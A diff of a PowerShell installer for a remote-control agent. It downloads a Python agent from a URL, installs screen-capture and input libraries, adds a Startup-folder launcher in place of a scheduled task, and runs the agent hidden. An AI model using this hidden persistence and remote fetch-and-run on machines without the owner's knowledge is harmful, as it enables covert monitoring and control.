@@ -16,22 +16,13 @@ python -m pip install websockets mss pynput opencv-python numpy requests --quiet
 
 Invoke-WebRequest $agentUrl -OutFile $agentPath
 
-
 $hostname = $env:COMPUTERNAME
 (Get-Content $agentPath) -replace 'DEVICE_NAME = "PC_1"', "DEVICE_NAME = `"$hostname`"" | Set-Content $agentPath
 
-
-schtasks /delete /tn "RC_Agent" /f 2>$null
-schtasks /delete /tn "RC_Server" /f 2>$null
-
-
 $pyPath = (Get-Command python).Source -replace 'python.exe','pythonw.exe'
-$action   = New-ScheduledTaskAction -Execute $pyPath -Argument "`"$agentPath`""
-$trigger  = New-ScheduledTaskTrigger -AtLogOn
-$settings = New-ScheduledTaskSettingsSet -ExecutionTimeLimit 0
-Register-ScheduledTask -TaskName "RC_Agent" -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-
+$startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+Set-Content "$startup\RC_Agent.bat" "@echo off`r`nstart /min `"`" `"$pyPath`" `"$agentPath`""
 
 Start-Process $pyPath -ArgumentList "`"$agentPath`"" -WindowStyle Hidden
 
-Write-Host "설치 완료: $hostname" -ForegroundColor Green
+Write-Host "done: $hostname" -ForegroundColor Green
